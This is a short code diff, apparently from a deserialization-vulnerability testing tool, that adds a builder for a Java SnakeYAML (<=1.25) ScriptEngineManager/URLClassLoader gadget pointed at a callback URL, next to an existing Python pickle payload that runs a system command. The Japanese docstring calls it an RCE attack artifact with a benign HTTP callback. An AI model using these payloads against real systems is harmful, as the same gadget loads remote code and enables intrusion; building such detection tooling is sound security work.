@@ -44,8 +44,25 @@ def _build_python_pickle(callback_url: str) -> bytes:
     return pickle.dumps(_PickleOSSystem(_http_callback_cmd(callback_url)))
 
 
+def _build_java_snakeyaml(callback_url: str) -> bytes:
+    """Java SnakeYAML(<=1.25): load() 時に ScriptEngineManager ガジェットを起動する YAML。
+
+    `ScriptEngineManager(URLClassLoader([URL("<callback>/")]))` を構成させると、SnakeYAML の
+    型解決過程で JDK の ServiceLoader が URLClassLoader のベース URL に
+    `META-INF/services/javax.script.ScriptEngineFactory` を付けて**外向き HTTP 取得**する。
+    その取得先を我々の受信器（コールバック URL）にするため、末尾を `/` で終わるベース URL に
+    正規化して token を含むパス配下を叩かせる。実行される動作は良性（受信器への HTTP GET/HEAD）。
+    生成物は攻撃成果物（デシリアライズ RCE ガジェット）だが破壊的動作は含まない。"""
+    base = callback_url.rstrip("/") + "/"
+    return (
+        '!!javax.script.ScriptEngineManager '
+        '[!!java.net.URLClassLoader [[!!java.net.URL ["%s"]]]]' % base
+    ).encode("utf-8")
+
+
 _BUILDERS: Dict[str, Callable[[str], bytes]] = {
     "python_pickle": _build_python_pickle,
+    "java_snakeyaml": _build_java_snakeyaml,
 }
 
 
